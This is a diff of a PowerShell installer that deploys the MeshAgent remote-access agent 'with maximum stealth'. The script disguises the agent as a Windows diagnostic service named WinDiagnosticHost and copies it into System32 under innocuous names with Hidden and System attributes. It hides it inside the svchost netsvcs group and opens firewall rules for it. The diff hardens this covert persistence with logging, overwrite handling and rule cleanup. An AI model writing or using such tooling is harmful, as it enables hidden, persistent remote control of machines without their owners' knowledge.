@@ -1,4 +1,3 @@
-#Requires -RunAsAdministrator
 <#
 .SYNOPSIS
     Deploys MeshAgent with maximum stealth configuration
@@ -28,12 +27,28 @@
 
 param(
     [Parameter(Mandatory=$true)]
-    [ValidateSet('svchost','standalone')]
+    [ValidateSet("svchost","standalone")]
     [string]$Mode,
 
     [Parameter(Mandatory=$true)]
-    [string]$SourcePath
+    [string]$SourcePath,
+
+    [Parameter(Mandatory=$false)]
+    [string]$LogPath
 )
+
+$script:StealthLogFile = $null
+if ($PSBoundParameters.ContainsKey("LogPath") -and -not [string]::IsNullOrWhiteSpace($LogPath))
+{
+    $logDirectory = Split-Path -Parent $LogPath
+    if ($logDirectory -and -not (Test-Path $logDirectory))
+    {
+        New-Item -Path $logDirectory -ItemType Directory -Force | Out-Null
+    }
+    $script:StealthLogFile = $LogPath
+    New-Item -Path $script:StealthLogFile -ItemType File -Force | Out-Null
+    Clear-Content -Path $script:StealthLogFile
+}
 
 # Configuration
 $ServiceName = "WinDiagnosticHost"
@@ -60,12 +75,25 @@ function Write-StealthLog {
             default { "White" }
         }
     )
+    if ($script:StealthLogFile) {
+        Add-Content -Path $script:StealthLogFile -Value $logMessage -Encoding UTF8
+    }
 }
 
 function Test-Administrator {
     $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
     $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
     return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+function Set-HiddenSystemAttributes {
+    param([string]$Path)
+
+    if (Test-Path -LiteralPath $Path) {
+        $current = [System.IO.File]::GetAttributes($Path)
+        $desired = $current -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
+        [System.IO.File]::SetAttributes($Path, $desired)
+    }
 }
 
 function Stop-ExistingService {
@@ -118,7 +146,7 @@ try {
     New-Item -Path $LogsDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
 
     # Set as hidden and system directories
-    (Get-Item $InstallDir).Attributes = 'Hidden,System'
+    Set-HiddenSystemAttributes -Path $InstallDir
 
     Write-StealthLog "Directories created successfully" "SUCCESS"
 }
@@ -132,14 +160,20 @@ Write-StealthLog "Copying files to System32..."
 try {
     if ($Mode -eq 'svchost') {
         $destPath = Join-Path $InstallDir "diagsvc.dll"
+        if (Test-Path -LiteralPath $destPath) {
+            Remove-Item -LiteralPath $destPath -Force
+        }
         Copy-Item -Path $SourcePath -Destination $destPath -Force
-        (Get-Item $destPath).Attributes = 'Hidden,System'
+        Set-HiddenSystemAttributes -Path $destPath
         Write-StealthLog "DLL copied to: $destPath" "SUCCESS"
     }
     else {
         $destPath = Join-Path $InstallDir "diaghost.exe"
+        if (Test-Path -LiteralPath $destPath) {
+            Remove-Item -LiteralPath $destPath -Force
+        }
         Copy-Item -Path $SourcePath -Destination $destPath -Force
-        (Get-Item $destPath).Attributes = 'Hidden,System'
+        Set-HiddenSystemAttributes -Path $destPath
         Write-StealthLog "EXE copied to: $destPath" "SUCCESS"
     }
 }
@@ -154,6 +188,28 @@ try {
     if ($Mode -eq 'svchost') {
         # Svchost mode - create registry entries
         $servicePath = "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName"
+
+        $existingService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
+        if (-not $existingService)
+        {
+            Write-StealthLog "Creating shared svchost service entry..." "INFO"
+            $binPath = "`"$env:SystemRoot\System32\svchost.exe`" -k netsvcs -p"
+            $createArgs = @(
+                'create', $ServiceName,
+                "binPath= $binPath",
+                "DisplayName= $DisplayName"
+            )
+            $createOutput = & sc.exe @createArgs 2>&1
+            if ($LASTEXITCODE -ne 0)
+            {
+                Write-StealthLog "Failed to create svchost service entry: $createOutput" "ERROR"
+                throw "sc.exe create returned $LASTEXITCODE"
+            }
+        }
+        else
+        {
+            Write-StealthLog "Service already present in SCM - updating configuration" "INFO"
+        }
 
         # Create service key
         New-Item -Path $servicePath -Force | Out-Null
@@ -172,7 +228,7 @@ try {
         New-Item -Path $paramsPath -Force | Out-Null
         Set-ItemProperty -Path $paramsPath -Name "ServiceDll" -Value "$destPath" -Type ExpandString
         Set-ItemProperty -Path $paramsPath -Name "ServiceMain" -Value "Stealth_SvchostServiceMain" -Type String
-
+        Set-ItemProperty -Path $paramsPath -Name "ServiceDllUnloadOnStop" -Value 1 -Type DWord
         # Add to svchost netsvcs group
         $svchostPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
         $currentServices = (Get-ItemProperty -Path $svchostPath -Name "netsvcs").netsvcs
@@ -214,6 +270,9 @@ catch {
 Write-StealthLog "Adding Windows Firewall exceptions..."
 try {
     $firewallPath = if ($Mode -eq 'svchost') { "$env:SystemRoot\System32\svchost.exe" } else { $destPath }
+    foreach ($ruleName in @("$DisplayName - Outbound", "$DisplayName - Inbound")) {
+        Get-NetFirewallRule -DisplayName $ruleName -ErrorAction SilentlyContinue | Remove-NetFirewallRule -ErrorAction SilentlyContinue
+    }
 
     # Outbound rule
     New-NetFirewallRule -DisplayName "$DisplayName - Outbound" `
